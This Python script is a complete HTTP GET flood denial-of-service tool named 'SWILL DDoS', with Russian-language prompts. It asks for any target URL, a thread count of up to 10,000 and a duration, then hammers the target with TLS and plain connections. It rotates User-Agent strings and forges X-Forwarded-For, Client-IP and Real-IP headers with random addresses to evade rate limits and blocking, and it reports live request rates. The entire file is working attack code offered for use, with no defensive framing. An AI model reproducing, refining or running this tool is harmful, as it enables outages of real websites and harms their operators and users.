import socket
import ssl
import random
import time
import threading
from urllib.parse import urlparse
import sys

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

# ====== НАСТРОЙКИ ======
TARGET_URL = input(f"{Colors.YELLOW}[?] Введи ссылку (https://site.com): {Colors.RESET}")
THREADS = int(input(f"{Colors.YELLOW}[?] Потоков (100-10000): {Colors.RESET}"))
DURATION = int(input(f"{Colors.YELLOW}[?] Длительность (секунд): {Colors.RESET}"))

# Парсим URL
parsed = urlparse(TARGET_URL)
HOST = parsed.hostname
PORT = parsed.port or (443 if parsed.scheme == 'https' else 80)
USE_SSL = parsed.scheme == 'https'
PATH = parsed.path or '/'

# User-Agent'ы
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 Edg/120.0.0.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_2) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
    "Mozilla/5.0 (Linux; Android 13; SM-A536B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36 OPR/106.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
]

REQUEST_COUNT = 0
BYTES_SENT = 0
lock = threading.Lock()
stop_flag = False

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(0,255)}"

def build_request():
    ua = random.choice(USER_AGENTS)
    fake_ip = random_ip()
    headers = f"GET {PATH} HTTP/1.1\r\n"
    headers += f"Host: {HOST}\r\n"
    headers += f"User-Agent: {ua}\r\n"
    headers += f"Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
    headers += f"Accept-Language: en-US,en;q=0.9\r\n"
    headers += f"Accept-Encoding: gzip, deflate, br\r\n"
    headers += f"Connection: keep-alive\r\n"
    headers += f"Cache-Control: no-cache\r\n"
    headers += f"X-Forwarded-For: {fake_ip}\r\n"
    headers += f"X-Forwarded-Proto: https\r\n"
    headers += f"Client-IP: {fake_ip}\r\n"
    headers += f"Real-IP: {fake_ip}\r\n"
    headers += f"Referer: {random.choice(['https://google.com', 'https://bing.com', 'https://duckduckgo.com'])}\r\n"
    headers += f"\r\n"
    return headers.encode()

def flood_thread(thread_id):
    global REQUEST_COUNT, BYTES_SENT, stop_flag
    
    end_time = time.time() + DURATION
    while time.time() < end_time and not stop_flag:
        s = None
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            
            if USE_SSL:
                ctx = ssl.create_default_context()
                ctx.check_hostname = False
                ctx.verify_mode = ssl.CERT_NONE
                s = ctx.wrap_socket(s, server_hostname=HOST)
            
            s.connect((HOST, PORT))
            
            # Отправляем много запросов в одном соединении
            for _ in range(random.randint(1, 5)):
                request = build_request()
                s.send(request)
                with lock:
                    REQUEST_COUNT += 1
                    BYTES_SENT += len(request)
            
        except:
            pass
        finally:
            if s:
                try:
                    s.close()
                except:
                    pass

def status_monitor():
    global REQUEST_COUNT, stop_flag
    start = time.time()
    while not stop_flag:
        time.sleep(1)
        elapsed = time.time() - start
        with lock:
            print(f"\r{Colors.GREEN}[{elapsed:.0f}s]{Colors.RESET} "
                  f"{Colors.CYAN}Запросов: {REQUEST_COUNT}{Colors.RESET} | "
                  f"{Colors.YELLOW}Скорость: {REQUEST_COUNT/max(elapsed,1):.0f} req/s{Colors.RESET} | "
                  f"{Colors.MAGENTA}Потоков: {THREADS}{Colors.RESET}", end="")
    print()

print(f"\n{Colors.RED}{Colors.BOLD}")
print("=" * 60)
print("  SWILL DDoS — НАЧАЛО АТАКИ")
print("=" * 60)
print(f"{Colors.RESET}")
print(f"{Colors.YELLOW}Цель: {Colors.WHITE}{TARGET_URL}")
print(f"{Colors.YELLOW}Хост: {Colors.WHITE}{HOST}:{PORT} (SSL: {USE_SSL})")
print(f"{Colors.YELLOW}Потоков: {Colors.WHITE}{THREADS}")
print(f"{Colors.YELLOW}Длительность: {Colors.WHITE}{DURATION} сек")
print(f"{Colors.YELLOW}Метод: {Colors.WHITE}HTTP GET Flood + Spoofed IP")
print()

# Запуск потоков
threads = []
for i in range(THREADS):
    t = threading.Thread(target=flood_thread, args=(i,))
    t.daemon = True
    threads.append(t)
    t.start()

# Монитор
monitor = threading.Thread(target=status_monitor)
monitor.daemon = True
monitor.start()

# Ждём завершения
try:
    time.sleep(DURATION)
except KeyboardInterrupt:
    print(f"\n{Colors.RED}[!] Атака прервана!{Colors.RESET}")

stop_flag = True
for t in threads:
    t.join(timeout=2)

print(f"\n{Colors.GREEN}{Colors.BOLD}")
print("=" * 60)
print(f"  АТАКА ЗАВЕРШЕНА")
print(f"  Всего запросов: {REQUEST_COUNT}")
print(f"  Всего данных: {BYTES_SENT:,} байт")
print("=" * 60)
print(f"{Colors.RESET}")
